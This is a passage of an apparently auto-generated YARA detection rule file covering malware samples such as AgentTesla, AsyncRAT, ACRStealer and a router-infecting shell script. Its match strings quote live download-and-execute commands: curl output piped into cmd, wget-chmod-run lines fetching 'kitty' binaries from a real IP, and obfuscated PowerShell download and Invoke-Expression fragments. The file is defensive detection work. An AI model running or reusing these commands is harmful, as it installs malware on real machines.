      $s11 = "73747255524c202020203d2022687474703a2f2f3139392e3130332e36332e3232312f70726f67734b4b2f416c6c2e657865222020272723205468652055524c" ascii /* score: '24.00'*/ /* hex encoded string 'strURL    = "http://199.103.63.221/progsKK/All.exe"  ''# The URL to download' */
      $s12 = "440000003800000052003a005c004c00410042002d0049004e00500053005c005700410052005c0070006100740065006e00740065002e00690063006f000000" ascii /* score: '24.00'*/ /* hex encoded string 'D8R:\LAB-INPS\WAR\patente.ico' */
      $s13 = "430041005200540041002000440027004900440045004e00540049005400410000000000460000003c0000003000000052003a005c004c00410042002d004900" ascii /* score: '24.00'*/ /* hex encoded string 'CARTA D'IDENTITAF<0R:\LAB-I' */
      $s14 = "2b2e4463484574416e2e4021402a217e4f3432485055436a2b4141347e71786d444978736d5664323d3f6e502c68322878314b4b7462554c294128624b7e303b" ascii /* score: '24.00'*/ /* hex encoded string '+.DcHEtAn.@!@*!~O42HPUCj+AA4~qxmDIxsmVd2=?nP,h2(x1KKtbUL)A(bK~0;' */
      $s15 = "540045002e00760062007300000046000000440000003800000052003a005c004c00410042002d0049004e00500053005c005700410052005c0070006100" ascii /* score: '24.00'*/ /* hex encoded string 'TE.vbsFD8R:\LAB-INPS\WAR\pa' */
   condition:
      uint16(0) == 0x5c7b and filesize < 500KB and
      8 of them
}

rule aa68e02c8826ddb267e5513e181e3ae48cd02c5d1f25c41166b992bf6cfea04b_aa68e02c {
   meta:
      description = "_subset_batch - file aa68e02c8826ddb267e5513e181e3ae48cd02c5d1f25c41166b992bf6cfea04b_aa68e02c.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aa68e02c8826ddb267e5513e181e3ae48cd02c5d1f25c41166b992bf6cfea04b"
   strings:
      $s1 = "vZiZ:\"" fullword ascii /* score: '10.00'*/
      $s2 = "ojfnaiemc" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 5000KB and
      all of them
}

rule aacb135388c06262d65fe96c30bc9ec7a1756fb0b2ca556e8986f0bc774cb307_aacb1353 {
   meta:
      description = "_subset_batch - file aacb135388c06262d65fe96c30bc9ec7a1756fb0b2ca556e8986f0bc774cb307_aacb1353.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aacb135388c06262d65fe96c30bc9ec7a1756fb0b2ca556e8986f0bc774cb307"
   strings:
      $s1 = "$decoded = [Text.Encoding]::UTF8.GetString($data)" fullword ascii /* score: '23.00'*/
      $s2 = "Invoke-Expression $decoded" fullword ascii /* score: '15.00'*/
      $s3 = "for ($i=0; $i -lt $data.Length; $i++) {" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 300KB and
      all of them
}

rule ac305b0f96601ec6d3334f9f4e64bb3b80825319bd5ddf3cc8250483b0d777c2_ac305b0f {
   meta:
      description = "_subset_batch - file ac305b0f96601ec6d3334f9f4e64bb3b80825319bd5ddf3cc8250483b0d777c2_ac305b0f.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ac305b0f96601ec6d3334f9f4e64bb3b80825319bd5ddf3cc8250483b0d777c2"
   strings:
      $x1 = "cmd.exe /c start \"\" /min cmd /k \"curl -s http://85.209.129.105:2020/19 | cmd && exit\"" fullword ascii /* score: '50.00'*/
   condition:
      uint16(0) == 0x6d63 and filesize < 1KB and
      1 of ($x*)
}

rule ac865a937e37f500d43250d6218b8f9117599a7238947ac5bdf6a353fe91ebd8_ac865a93 {
   meta:
      description = "_subset_batch - file ac865a937e37f500d43250d6218b8f9117599a7238947ac5bdf6a353fe91ebd8_ac865a93.jar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ac865a937e37f500d43250d6218b8f9117599a7238947ac5bdf6a353fe91ebd8"
   strings:
      $s1 = "com/sun/jna/win32-aarch64/jnidispatch.dll" fullword ascii /* score: '23.00'*/
      $s2 = "com/sun/jna/win32-x86/jnidispatch.dll" fullword ascii /* score: '23.00'*/
      $s3 = "com/sun/jna/win32-x86-64/jnidispatch.dll" fullword ascii /* score: '23.00'*/
      $s4 = "com/sun/jna/Function$PostCallRead.class" fullword ascii /* score: '11.00'*/
      $s5 = "com/sun/jna/Function$PostCallRead.classmN;" fullword ascii /* score: '11.00'*/
      $s6 = "a.dllPK" fullword ascii /* score: '10.00'*/
      $s7 = "* {3{0DI" fullword ascii /* score: '9.00'*/
      $s8 = "* uHKQ" fullword ascii /* score: '9.00'*/
      $s9 = ";eyEL\\." fullword ascii /* score: '9.00'*/
      $s10 = "F'@Qspy:&jb2" fullword ascii /* score: '9.00'*/
      $s11 = "R - gz" fullword ascii /* score: '9.00'*/
      $s12 = "com/sun/jna/ELFAnalyser$ELFSectionHeaders.class" fullword ascii /* score: '8.00'*/
      $s13 = "com/sun/jna/win32/DLLCallback.classM" fullword ascii /* score: '8.00'*/
      $s14 = "ztBY!." fullword ascii /* score: '8.00'*/
      $s15 = "xrvbxbb" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 23000KB and
      8 of them
}

rule ACRStealer_signature__3 {
   meta:
      description = "_subset_batch - file ACRStealer(signature).7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9f315d56b01e36e61428972be42668ae091b4d9e865485644faa6cf4b2a0d048"
   strings:
      $s1 = "UsGE:\"T" fullword ascii /* score: '10.00'*/
      $s2 = "* !-=j" fullword ascii /* score: '9.00'*/
      $s3 = "* 21DX" fullword ascii /* score: '9.00'*/
      $s4 = "4)$(A\"{75" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Ju' */
      $s5 = "($2!B<*\"" fullword ascii /* score: '9.00'*/ /* hex encoded string '+' */
      $s6 = "*;HTVUW9- Y" fullword ascii /* score: '8.00'*/
      $s7 = "vurpwqn" fullword ascii /* score: '8.00'*/
      $s8 = "%XJig_%DUi\\" fullword ascii /* score: '8.00'*/
      $s9 = "h.cOMl" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 23000KB and
      all of them
}

rule ACRStealer_signature__2b7485af {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_2b7485af.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "2b7485afec7427585d959806feb139e21ab4e560f5d48dfbed8c8932759cc078"
   strings:
      $s1 = "Upd@te!D/x64/tradingnetworkingsockets.dll" fullword ascii /* score: '20.00'*/
      $s2 = "Upd@te!D/x64/trading_api64.dll" fullword ascii /* score: '20.00'*/
      $s3 = "Upd@te!D/OmgbkupRes_ENU.dll" fullword ascii /* score: '20.00'*/
      $s4 = "Upd@te!D/SsCustom.dll" fullword ascii /* score: '20.00'*/
      $s5 = "Upd@te!D/S!At~Up.exe" fullword ascii /* score: '16.00'*/
      $s6 = "DbvLc:\"5A" fullword ascii /* score: '10.00'*/
      $s7 = "WEeF:\"" fullword ascii /* score: '10.00'*/
      $s8 = "FBdlLTj" fullword ascii /* score: '9.00'*/
      $s9 = ")4{52-D60" fullword ascii /* score: '9.00'*/ /* hex encoded string 'E-`' */
      $s10 = "* BNu{" fullword ascii /* score: '9.00'*/
      $s11 = "hnnfjbblllddd" fullword ascii /* score: '8.00'*/
      $s12 = "hbxuagv" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 16000KB and
      8 of them
}

rule ACRStealer_signature__43f8d3be {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_43f8d3be.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "43f8d3be6d7c26a3d000bc03a30b5c3930bdee2f6dd9923e2b6a20050c24b24c"
   strings:
      $s1 = "x64/trading_api64.dll" fullword ascii /* score: '20.00'*/
      $s2 = "x64/tradingnetworkingsockets.dll" fullword ascii /* score: '20.00'*/
      $s3 = "Up.dll" fullword ascii /* score: '17.00'*/
      $s4 = "Ccz5kVD5O" fullword ascii /* base64 encoded string 's>dT>N' */ /* score: '11.00'*/
      $s5 = "Seckteak.tzc" fullword ascii /* score: '10.00'*/
      $s6 = "ppevnt.ini" fullword ascii /* score: '10.00'*/
      $s7 = "alxf:\"\"" fullword ascii /* score: '10.00'*/
      $s8 = "* YT2tON" fullword ascii /* score: '9.00'*/
      $s9 = "* :DP1]" fullword ascii /* score: '9.00'*/
      $s10 = "mkVjj -" fullword ascii /* score: '8.00'*/
      $s11 = "Jn^LC%wbLA%wjL?%wZL=%7?" fullword ascii /* score: '8.00'*/
      $s12 = "jdqbqyvi" fullword ascii /* score: '8.00'*/
      $s13 = "weheakn" fullword ascii /* score: '8.00'*/
      $s14 = "mljfffz" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 19000KB and
      8 of them
}

rule ACRStealer_signature__001fc225 {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_001fc225.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "001fc225a375073a1d8214f47ae8658b8a71e2dfd55f78c63b75569be5c68415"
   strings:
      $s1 = "cjTEO.AkO" fullword ascii /* score: '10.00'*/
      $s2 = "3&<\\9-\\" fullword ascii /* score: '9.00'*/ /* hex encoded string '9' */
      $s3 = "zhcV!." fullword ascii /* score: '8.00'*/
      $s4 = "4%qMpeQ%QZE" fullword ascii /* score: '8.00'*/
      $s5 = "\\HM:\\k" fullword ascii /* score: '8.00'*/
      $s6 = "rtkhcfn" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 15000KB and
      all of them
}

rule ACRStealer_signature__0bd7e681 {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_0bd7e681.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "0bd7e6818a80851c44f1010eb8bea06b3f1ae0be6d401727532eceb8832bd3b3"
   strings:
      $s1 = "Y>b^ciFTpT4" fullword ascii /* score: '9.00'*/
      $s2 = "IFxiftp" fullword ascii /* score: '9.00'*/
      $s3 = "*NpOStr8" fullword ascii /* score: '9.00'*/
      $s4 = "]|%D%>" fullword ascii /* score: '8.00'*/
      $s5 = "%GQDo%.[h-" fullword ascii /* score: '8.00'*/
      $s6 = "dJfKl!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 23000KB and
      all of them
}

rule ACRStealer_signature__1ac30192 {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_1ac30192.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "1ac301924bcc7cb099e320ff5f0f854ee78379907a8549af2fbb1e69e31477e6"
   strings:
      $s1 = "PG%g:\\u" fullword ascii /* score: '9.50'*/
      $s2 = "(2b38=<\"" fullword ascii /* score: '9.00'*/ /* hex encoded string '+8' */
      $s3 = "&,5`<\\%7" fullword ascii /* score: '9.00'*/ /* hex encoded string 'W' */
      $s4 = "8#+ -b3T!" fullword ascii /* score: '9.00'*/
      $s5 = "UXOd@* A" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 10000KB and
      all of them
}

rule ACRStealer_signature__93b56c0f {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_93b56c0f.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "93b56c0f4bd1886b86fdd2508e73c2c9da50dccf6ef1e7c43decac41e4c1362c"
   strings:
      $s1 = "* T1tk" fullword ascii /* score: '9.00'*/
      $s2 = "* MPm3" fullword ascii /* score: '9.00'*/
      $s3 = "krtftfd" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 10000KB and
      all of them
}

rule ACRStealer_signature__c418be6b {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_c418be6b.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "c418be6ba726232196882aa09a7f5db68c26934d38882e2c25df97590634e391"
   strings:
      $s1 = "yQHy.kPJ" fullword ascii /* score: '10.00'*/
      $s2 = "<\",}}4d:" fullword ascii /* score: '9.00'*/ /* hex encoded string 'M' */
      $s3 = "r_* -qH" fullword ascii /* score: '9.00'*/
      $s4 = "3]a+ *(#" fullword ascii /* score: '9.00'*/ /* hex encoded string ':' */
      $s5 = "TFsFTp<" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 16000KB and
      all of them
}

rule ACRStealer_signature__e4b68a22 {
   meta:
      description = "_subset_batch - file ACRStealer(signature)_e4b68a22.7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e4b68a22bf8c64a20efba194be56363f215c9eaec83f2c92ae7c650d6477f72e"
   strings:
      $s1 = "LiZrcydX0" fullword ascii /* base64 encoded string '.&ks'W' */ /* score: '15.00'*/
      $s2 = "* Na|{|" fullword ascii /* score: '9.00'*/
      $s3 = "- -h)u" fullword ascii /* score: '9.00'*/
      $s4 = "LOUO /J+" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 10000KB and
      all of them
}

rule ae26622fa1afe1c5d668220ed1ceddda90b642d5ccdcedbf2d88c7320d47dac6_ae26622f {
   meta:
      description = "_subset_batch - file ae26622fa1afe1c5d668220ed1ceddda90b642d5ccdcedbf2d88c7320d47dac6_ae26622f.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ae26622fa1afe1c5d668220ed1ceddda90b642d5ccdcedbf2d88c7320d47dac6"
   strings:
      $s1 = "var throughflows = mosstrooper.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var antrectomy = mosstrooper.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var abthainry = Pythic.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var Portwood = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '15.00'*/
      $s5 = "vinylic = vinylic + 'gingivectomy$gingivectomywc.gingivectomyHeagingivectomyders.gingivectomyAdd(gingivectomy\\'Usegingivectomyr" ascii /* score: '13.00'*/
      $s6 = "vinylic = vinylic + 'gingivectomyhgingivectomyegingivectomylgingivectomyl -gingivectomy';" fullword ascii /* score: '12.00'*/
      $s7 = "var mosstrooper = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s8 = "var Pythic = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s9 = "Agentgingivectomy\\',\\'Mgingivectomyozgingivectomyillagingivectomy/5.0\\'); ';" fullword ascii /* score: '9.00'*/
      $s10 = "vinylic = vinylic + 'gingivectomy$gingivectomywc.gingivectomyHeagingivectomyders.gingivectomyAdd(gingivectomy\\'Usegingivectomyr" ascii /* score: '8.00'*/
      $s11 = "vinylic = vinylic + 'gingivectomy$b6gingivectomy4=$wgingivectomyc.DowgingivectomynloagingivectomydStgingivectomyringingivectomyg" ascii /* score: '8.00'*/
      $s12 = "vinylic = vinylic + 'gingivectomy[Sygingivectomystgingivectomyegingivectomym.Tgingivectomyexgingivectomyt.Engingivectomycogingiv" ascii /* score: '8.00'*/
      $s13 = "vinylic = vinylic + 'gingivectomy-Cogingivectomymmgingivectomy';" fullword ascii /* score: '8.00'*/
      $s14 = "vinylic = vinylic + 'gingivectomyegingivectomyrgingivectomysgingivectomy';" fullword ascii /* score: '8.00'*/
      $s15 = "vinylic = vinylic + 'gingivectomydgingivectomyowgingivectomyStgingivectomy';" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 8KB and
      8 of them
}

rule af2fc5a16b31f65e0dbad27ac534090e0520ce6225e5c61e86010e6ce60f991d_af2fc5a1 {
   meta:
      description = "_subset_batch - file af2fc5a16b31f65e0dbad27ac534090e0520ce6225e5c61e86010e6ce60f991d_af2fc5a1.sh"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "af2fc5a16b31f65e0dbad27ac534090e0520ce6225e5c61e86010e6ce60f991d"
   strings:
      $s1 = "wget http://66.78.40.221/kitty.mips; chmod 777 kitty.mips; ./kitty.mips router.zyxel; rm kitty.mips" fullword ascii /* score: '20.00'*/
      $s2 = "wget http://66.78.40.221/kitty.mipsel; chmod 777 kitty.mipsel; ./kitty.mipsel router.zyxel; rm kitty.mipsel" fullword ascii /* score: '20.00'*/
      $s3 = "wget http://66.78.40.221/kitty.armv5; chmod 777 kitty.armv5; ./kitty.armv5 router.zyxel; rm kitty.armv5" fullword ascii /* score: '20.00'*/
      $s4 = "wget http://66.78.40.221/kitty.x86_64; chmod 777 kitty.x86_64; ./kitty.x86_64 router.zyxel; rm kitty.x86_64" fullword ascii /* score: '20.00'*/
      $s5 = "wget http://66.78.40.221/kitty.x86; chmod 777 kitty.x86; ./kitty.x86 router.zyxel; rm kitty.x86" fullword ascii /* score: '20.00'*/
      $s6 = "wget http://66.78.40.221/kitty.armv7; chmod 777 kitty.armv7; ./kitty.armv7 router.zyxel; rm kitty.armv7" fullword ascii /* score: '20.00'*/
      $s7 = "wget http://66.78.40.221/kitty.aarch64; chmod 777 kitty.aarch64; ./kitty.aarch64 router.zyxel; rm kitty.aarch64" fullword ascii /* score: '20.00'*/
      $s8 = "wget http://66.78.40.221/kitty.armv6; chmod 777 kitty.armv6; ./kitty.armv6 router.zyxel; rm kitty.armv6" fullword ascii /* score: '20.00'*/
      $s9 = "cd /tmp || cd /var/tmp || cd /var || cd /mnt || cd /dev || cd /" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6463 and filesize < 2KB and
      all of them
}

rule af4c06c12e8e6c39aaed264e66da76e80f2c1e82a87858cb46c89dab40967481_af4c06c1 {
   meta:
      description = "_subset_batch - file af4c06c12e8e6c39aaed264e66da76e80f2c1e82a87858cb46c89dab40967481_af4c06c1.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "af4c06c12e8e6c39aaed264e66da76e80f2c1e82a87858cb46c89dab40967481"
   strings:
      $s1 = "P0%l:\"px'-" fullword ascii /* score: '9.50'*/
      $s2 = "4*%D%%" fullword ascii /* score: '8.00'*/
      $s3 = "uespemos" fullword ascii /* score: '8.00'*/
      $s4 = "Si_%d%L" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 5000KB and
      all of them
}

rule AgentTesla_signature__8aa1ec71 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_8aa1ec71.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "8aa1ec71a9b149cc8fabb0e561ad3c026c778e90f36627384feb85566ec53abe"
   strings:
      $s1 = "var natatores = lapful.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var welcome = lapful.Get(\"Win32_Process\");" fullword ascii /* score: '26.00'*/
      $s3 = "var nephila = centrism.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var lapful = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var communicantes = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '11.00'*/
      $s6 = "var centrism = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "/5.0\\'); ';" fullword ascii /* score: '9.00'*/ /* hex encoded string 'P' */
      $s8 = "ression" fullword ascii /* score: '8.00'*/
      $s9 = "g(\\'' + nonpharmacists + '\\'); ';" fullword ascii /* score: '8.00'*/
      $s10 = "lemming = lemming + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 20KB and
      all of them
}

rule AgentTesla_signature__4 {
   meta:
      description = "_subset_batch - file AgentTesla(signature).7z"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bfced4885e00cafbf73330ac6fcd23a24f096c2f873b55a20e10c623280f842d"
   strings:
      $s1 = ")PO-ROWA-6005525.exe" fullword wide /* score: '19.00'*/
      $s2 = "NxYK!." fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7a37 and filesize < 4000KB and
      all of them
}

rule AgentTesla_signature__5 {
   meta:
      description = "_subset_batch - file AgentTesla(signature).gz"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f77418508fe5e6c34d551a94e628c05b8c9815880fdfcbccbcea91d6d6ee91da"
   strings:
      $s1 = "OVERDUE STATEMENT.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x8b1f and filesize < 900KB and
      all of them
}

rule AgentTesla_signature__3c333ddf {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_3c333ddf.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3c333ddfd7b58a2b3a79a5c0ae6cc49fa917d5f8983100bf08c30a5c2a456de3"
   strings:
      $s1 = "var dinocerata = bartends.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var motorsailer = bartends.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var physicomental = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '15.00'*/
      $s4 = "var decastere = plurative.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '15.00'*/
      $s5 = "var bartends = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var plurative = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "g(\\'' + semicolumnar + '\\'" fullword ascii /* score: '8.00'*/
      $s8 = "botnets = botnets + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule AsyncRAT_signature__2 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ab241fc6d007714e66840aaa0f72165e744cc970515f5de973313c82851e6962"
   strings:
      $s1 = "var silvertip = etherizer.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "            + \"xmlns:PdfNs='http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf' \"" fullword ascii /* score: '24.00'*/
      $s3 = "var gauzily = etherizer.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s4 = "    /// xmlns:pdfNs= 'http://schemas.microsoft.com/windows/2015/02/printing/printschemakeywords/microsoftprinttopdf'" fullword ascii /* score: '20.00'*/
      $s5 = "            + \"xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12' \"" fullword ascii /* score: '19.00'*/
      $s6 = "            + \"xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' \"" fullword ascii /* score: '19.00'*/
      $s7 = "var trinucleotide = pagody.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s8 = "            + \"xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' \"" fullword ascii /* score: '19.00'*/
      $s9 = "            + \"xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11' \"" fullword ascii /* score: '19.00'*/
      $s10 = "    /// xmlns:psk12='http://schemas.microsoft.com/windows/2013/12/printing/printschemakeywordsv12'" fullword ascii /* score: '15.00'*/
      $s11 = "    ///     xmlns:psf=\"http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework\"" fullword ascii /* score: '15.00'*/
      $s12 = "        \"xmlns:psf='http://schemas.microsoft.com/windows/2003/08/printing/printschemaframework' \"" fullword ascii /* score: '15.00'*/
      $s13 = "    /// xmlns:psk11='http://schemas.microsoft.com/windows/2013/05/printing/printschemakeywordsv11'" fullword ascii /* score: '15.00'*/
      $s14 = "    /// xmlns:psk='http://schemas.microsoft.com/windows/2003/08/printing/printschemakeywords' " fullword ascii /* score: '15.00'*/
      $s15 = "    /// xmlns:psf2='http://schemas.microsoft.com/windows/2013/12/printing/printschemaframework2' " fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x0a0d and filesize < 200KB and
      8 of them
}

rule AsyncRAT_signature__3b40cbd7 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_3b40cbd7.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "3b40cbd70c8f42a757ebb650ad908de05dbc647ade92e773cb17e62ea5c0bac1"
   strings:
      $s1 = "var sluicing = curdiness.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var thetic = curdiness.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var momblement = judgements.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '19.00'*/
      $s4 = "var submissiveness = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s5 = "var curdiness = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s6 = "var judgements = new ActiveXObject(\"Scripting.FileSystemObject\");" fullword ascii /* score: '10.00'*/
      $s7 = "g(\\'' + unlipsticked + '\\'" fullword ascii /* score: '8.00'*/
      $s8 = "amaril = amaril + '" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x2f2f and filesize < 1000KB and
      all of them
}

rule b2d2952e372cb282733994c4e08d66ebe1b10af3a182389cab66f8c69e57d8e3_b2d2952e {
   meta:
      description = "_subset_batch - file b2d2952e372cb282733994c4e08d66ebe1b10af3a182389cab66f8c69e57d8e3_b2d2952e.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "b2d2952e372cb282733994c4e08d66ebe1b10af3a182389cab66f8c69e57d8e3"
   strings:
      $s1 = "var scentless = alsatians.Get(\"Win32_ProcessStartup\").SpawnInstance_();" fullword ascii /* score: '26.00'*/
      $s2 = "var futhorc = alsatians.Get(\"Win32_Process\");" fullword ascii /* score: '23.00'*/
      $s3 = "var hypotonic = carcanets.GetParentFolderName(WScript.ScriptFullName);" fullword ascii /* score: '15.00'*/
      $s4 = "var alsatians = GetObject(\"winmgmts:root\\\\cimv2\");" fullword ascii /* score: '12.00'*/
      $s5 = "var fidicula = new ActiveXObject(\"WScript.Shell\"); " fullword ascii /* score: '12.00'*/
      $s6 = "emptysis = emptysis + '" fullword ascii /* score: '8.00'*/
      $s7 = "g(\\'' + fraunchise + '\\'" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 100KB and
      all of them
}

rule AgentTesla_signature__6 {
   meta:
      description = "_subset_batch - file AgentTesla(signature).js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "bf791d2f61f0457cd58d4b0130da8ca8c44a8db9dd6ba65d62c233bc001654bf"
   strings:
      $s1 = "(function(c,d){var r=b,e=c();while(!![]){try{var f=parseInt(r(0x19a))/0x1*(parseInt(r(0x194))/0x2)+-parseInt(r(0x193))/0x3+-pars" ascii /* score: '16.00'*/
      $s2 = ",(function(){var s=b,c=WScript[s(0x1bd)](s(0x1b0)),d=WScript[s(0x1bd)](s(0x1b2)),f=c['ExpandEnvironmentStrings'](s(0x195)),g=s(0" ascii /* score: '10.00'*/
      $s3 = "x1,q[u(0x1ba)](),q[u(0x1a5)](p['responseBody']),q[u(0x1b9)](o,0x2),q[u(0x196)](),!![];}function l(n,o){var v=s,p=WScript[v(0x1bd" ascii /* score: '10.00'*/
      $s4 = "{p+='%'+('00'+o['charCodeAt'](u)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(p);};b['mLHkUE']=i,c=arguments,b['" ascii /* score: '9.00'*/
      $s5 = ",0x14),!![];}function m(n){var w=s,o=new Enumerator(d[w(0x197)](n)['Files']);while(!o['atEnd']()){var p=o['item']();if(d['GetExt" ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6628 and filesize < 8KB and
      all of them
}

rule AgentTesla_signature__7 {
   meta:
      description = "_subset_batch - file AgentTesla(signature).rar"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9b45c4badfc9d041abcc6d169b88da4bb648a608e404f9d0329dbe8b1083b17b"
   strings:
      $s1 = "(Purchase Order PROWORKS=2025-824.pdf.exe" fullword ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 1000KB and
      all of them
}

rule AgentTesla_signature__ed836463 {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_ed836463.vbs"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ed836463d993fa9289155a64ddb613b5314612a1556ef54895c878405358dbea"
   strings:
      $s1 = "Set bewaring = relicensed.Get(\"Win32_ProcessStartup\").SpawnInstance_" fullword ascii /* score: '26.00'*/
      $s2 = "Set eviscerations = relicensed.Get(\"Win32_Process\")" fullword ascii /* score: '23.00'*/
      $s3 = "LARPed = necroscopical.GetParentFolderName(WScript.ScriptFullName)" fullword ascii /* score: '15.00'*/
      $s4 = "rshell -N" fullword ascii /* score: '13.00'*/
      $s5 = "Set relicensed = GetObject(\"winmgmts:root\\cimv2\")" fullword ascii /* score: '12.00'*/
   condition:
      uint16(0) == 0x6553 and filesize < 100KB and
      all of them
}

rule AgentTesla_signature__050f48be {
   meta:
      description = "_subset_batch - file AgentTesla(signature)_050f48be.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
